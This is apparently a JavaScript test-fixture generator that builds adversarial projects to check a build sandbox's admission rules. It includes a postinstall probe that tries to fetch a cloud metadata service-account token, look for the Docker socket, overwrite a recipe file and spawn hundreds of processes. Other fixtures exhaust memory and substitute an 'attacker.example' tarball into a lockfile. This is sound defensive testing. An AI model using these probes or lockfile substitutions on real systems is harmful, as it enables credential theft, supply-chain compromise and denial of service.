// M11 build fixtures: clean scaffolds and adversaries. Each is a real project tree generated by
// the candidate's create-embody-app, locked against the recipe's bundled framework packages and
// packed with the M10 packer. Used by the local Docker run (test:m11) and the live cloud suite.
import { spawn } from "node:child_process";
import { readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";

/** Root postinstall probe: runs as customer code inside the sandbox; prints one JSON line. */
const PROBE = `import { spawn } from "node:child_process";
import { existsSync, readdirSync, writeFileSync } from "node:fs";
const attempt = async (url, init = {}) => {
  try {
    const r = await fetch(url, { ...init, signal: AbortSignal.timeout(3000) });
    return "status-" + r.status;
  } catch (e) {
    return "blocked";
  }
};
const target = process.env.EMBODY_PROBE_TARGET ?? "";
const report = {
  uid: process.getuid?.(),
  metadataIp: await attempt("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", { headers: { "Metadata-Flavor": "Google" } }),
  metadataHost: await attempt("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", { headers: { "Metadata-Flavor": "Google" } }),
  publicRegistry: await attempt("https://registry.npmjs.org/"),
  storageApi: await attempt("https://storage.googleapis.com/"),
  cloudRunApi: await attempt("https://run.googleapis.com/v2/projects/x/locations/us-central1/services", { method: "POST" }),
  otherSource: FOREIGN_SOURCE_URL ? await attempt(FOREIGN_SOURCE_URL) : "not-configured",
  dockerSocket: existsSync("/var/run/docker.sock"),
  workspaceVisible: existsSync("/workspace"),
  builderOutputsVisible: existsSync("/builder/outputs"),
  platformEnv: Object.keys(process.env).filter((k) => /^(EMBODY_SOURCE|GOOGLE|CLOUDSDK|BUILDER_OUTPUT|PROJECT_ID|BUILD_ID)/.test(k)),
  canWriteRecipe: (() => { try { writeFileSync("/embody/prepare.mjs", "x"); return true; } catch { return false; } })(),
  rootDirs: readdirSync("/").sort().join(","),
};
// Process bound: try to start more processes than the sandbox allows.
let started = 0;
const children = [];
for (let i = 0; i < 700; i++) {
  try {
    const child = spawn("sleep", ["5"], { stdio: "ignore" });
    await new Promise((resolve, reject) => { child.once("spawn", resolve); child.once("error", reject); });
    children.push(child);
    started++;
  } catch { break; }
}
for (const child of children) child.kill("SIGKILL");
report.processesStarted = started;
console.log("EMBODY_PROBE " + JSON.stringify(report));
`;

// Printed by a postinstall script. The PEM header is assembled at runtime: the M10 packer
// (correctly) refuses source files that contain private-key material.
const CANARY = `const pem = ["-----BEGIN", "PRIVATE KEY-----"].join(" ");
const end = ["-----END", "PRIVATE KEY-----"].join(" ");
console.log([pem, "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7canary0000000", end].join("\\n"));
console.log("token ya29.a0canarycanarycanarycanary0000");
console.log("url https://storage.googleapis.com/b/o?X-Goog-Signature=deadbeefcanary");
`;

/** Names of all fixtures and what admission must decide for each. */
export const M11_FIXTURES = Object.freeze({
  "request-only": { profile: "request-only", expect: "admitted" },
  durable: { profile: "durable", expect: "admitted" },
  probe: { profile: "request-only", expect: "admitted" },
  canary: { profile: "request-only", expect: "admitted" },
  "failing-build": { profile: "request-only", expect: "BUILD_FAILED" },
  "stale-lockfile": { profile: "request-only", expect: "LOCKFILE_REJECTED" },
  "tarball-lockfile": { profile: "request-only", expect: "LOCKFILE_REJECTED" },
  "missing-lockfile": { profile: "request-only", expect: "LOCKFILE_REJECTED" },
  "foreign-framework": { profile: "request-only", expect: "UNSUPPORTED_RUNTIME" },
  "unsupported-package-manager": { profile: "request-only", expect: "UNSUPPORTED_RUNTIME" },
  oversized: { profile: "request-only", expect: "OUTPUT_LIMIT" },
  "memory-hog": { profile: "request-only", expect: "BUILD_FAILED" },
});

async function editJson(path, edit) {
  const value = JSON.parse(await readFile(path, "utf8"));
  edit(value);
  await writeFile(path, `${JSON.stringify(value, null, 2)}\n`);
}

/**
 * Creates fixture `kind` under `directory` (must not exist) and returns its packed source.
 * `deps`: { createApp, packSource, registryUrl, pnpm?: string, foreignSourceUrl? }.
 */
export async function createFixture(kind, directory, deps) {
  const spec = M11_FIXTURES[kind];
  if (!spec) throw new Error(`Unknown fixture ${kind}`);
  await deps.createApp({
    name: `m11-${kind}`.slice(0, 40),
    destination: directory,
    profile: spec.profile,
    noInstall: true,
  });
  const pkg = join(directory, "package.json");
  const config = join(directory, "embody.config.ts");
  if (kind === "durable") {
    const text = await readFile(config, "utf8");
    await writeFile(
      config,
      text.replace('  description: "Describe', '  publishes: ["app.submitted"],\n  description: "Describe'),
    );
  }
  if (kind === "probe") {
    await writeFile(
      join(directory, "src/probe.mjs"),
      PROBE.replace("FOREIGN_SOURCE_URL ?", `${JSON.stringify(deps.foreignSourceUrl ?? "")} ?`).replace(
        "FOREIGN_SOURCE_URL)",
        `${JSON.stringify(deps.foreignSourceUrl ?? "")})`,
      ),
    );
    await editJson(pkg, (p) => (p.scripts.postinstall = "node src/probe.mjs"));
  }
  if (kind === "canary") {
    await writeFile(join(directory, "src/canary.mjs"), CANARY);
    await editJson(pkg, (p) => (p.scripts.postinstall = "node src/canary.mjs"));
  }
  if (kind === "failing-build") await editJson(pkg, (p) => (p.scripts.build = "node -e process.exit(3)"));
  if (kind === "oversized")
    await editJson(pkg, (p) => {
      p.scripts.build = `tsc -p tsconfig.json && node -e ${JSON.stringify(
        "const fs=require('fs');const b=Buffer.alloc(64*1024*1024,1);for(let i=0;i<9;i++)fs.writeFileSync('dist/blob'+i,b)",
      )}`;
    });
  if (kind === "memory-hog")
    await editJson(pkg, (p) => {
      p.scripts.postinstall = `node --max-old-space-size=16384 -e ${JSON.stringify(
        "const a=[];for(;;)a.push(Buffer.alloc(256*1024*1024,1))",
      )}`;
    });

  if (kind !== "missing-lockfile") {
    // Async: the framework registry may run in this same process.
    const [command, ...prefix] = deps.pnpm ?? ["corepack", "pnpm@11.25.0"];
    await new Promise((resolve, reject) => {
      const child = spawn(
        command,
        [
          ...prefix,
          "install",
          "--lockfile-only",
          "--ignore-scripts",
          `--config.@embody:registry=${deps.registryUrl}`,
          "--config.registry=https://registry.npmjs.org/",
        ],
        { cwd: directory, stdio: ["ignore", "ignore", "inherit"], env: { ...process.env, CI: "true" } },
      );
      child.on("error", reject);
      child.on("close", (code) => (code === 0 ? resolve() : reject(new Error(`lockfile generation failed for ${kind}`))));
    });
  }
  const lock = join(directory, "pnpm-lock.yaml");
  if (kind === "unsupported-package-manager")
    await editJson(pkg, (p) => (p.packageManager = "pnpm@9.0.0"));
  if (kind === "stale-lockfile")
    await editJson(pkg, (p) => (p.dependencies["left-pad"] = "^1.3.0"));
  if (kind === "tarball-lockfile") {
    const text = await readFile(lock, "utf8");
    await writeFile(
      lock,
      text.replace(
        /(\n  zod@[^:]+:\n    resolution: )\{integrity: [^}]+\}/,
        "$1{tarball: https://attacker.example/zod.tgz}",
      ),
    );
  }
  if (kind === "foreign-framework") {
    const text = await readFile(lock, "utf8");
    await writeFile(
      lock,
      text.replace(
        /(\n  '@embody\/core@[^:]+:\n    resolution: \{integrity: sha512-)[A-Za-z0-9+/]{4}/,
        "$1AAAA",
      ),
    );
  }
  return deps.packSource(directory);
}
